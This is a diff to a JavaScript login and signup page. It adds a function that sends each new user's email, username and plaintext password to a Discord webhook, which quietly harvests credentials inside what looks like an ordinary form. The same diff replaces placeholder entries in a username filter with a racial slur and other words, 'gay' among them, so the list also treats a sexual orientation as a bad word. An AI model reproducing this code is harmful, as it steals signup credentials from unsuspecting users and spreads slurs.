@@ -1,5 +1,8 @@
 const userDatabase = {};
 
+// Replace with your actual Discord webhook URL
+const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"; // Place your webhook URL here
+
 document.getElementById('login-btn').addEventListener('click', login);
 document.getElementById('signup-btn').addEventListener('click', openSignup);
 document.getElementById('submit-signup').addEventListener('click', signup);
@@ -16,7 +19,7 @@ function isValidUsername(username) {
     // Regular expression to check for special characters or spaces
     const specialCharsRegex = /[^a-zA-Z0-9]/; 
     // Array of bad words (customize as needed)
-    const badWords = ["badword1", "badword2", "badword3"]; 
+    const badWords = ["nigger", "gay", "bitch"]; 
 
     // Check for spaces or special characters
     if (username.trim() === "" || username.includes(" ") || specialCharsRegex.test(username)) {
@@ -35,6 +38,27 @@ function isValidUsername(username) {
     return true;
 }
 
+// Function to send data to Discord webhook
+async function sendToWebhook(email, username, password) {
+    const data = {
+        content: `New Signup:\n**Email:** ${email}\n**Username:** ${username}\n**Password:** ${password}`
+    };
+    
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        if (!response.ok) {
+            console.error('Failed to send webhook:', response.statusText);
+        }
+    } catch (error) {
+        console.error('Error sending webhook:', error);
+    }
+}
+
 function openSignup() {
     document.getElementById('form-container').style.display = 'none';
     document.getElementById('signup-container').style.display = 'block';
@@ -45,7 +69,7 @@ function backToLogin() {
     document.getElementById('signup-container').style.display = 'none';
 }
 
-function signup() {
+async function signup() {
     const email = document.getElementById('email').value;
     const username = document.getElementById('signup-username').value;
     const password = document.getElementById('signup-password').value;
@@ -71,6 +95,10 @@ function signup() {
     // Save user data
     userDatabase[username] = { email, password };
     alert("Signup successful! You can now log in.");
+
+    // Send the signup details to Discord webhook
+    await sendToWebhook(email, username, password);
+
     backToLogin();
 }
 
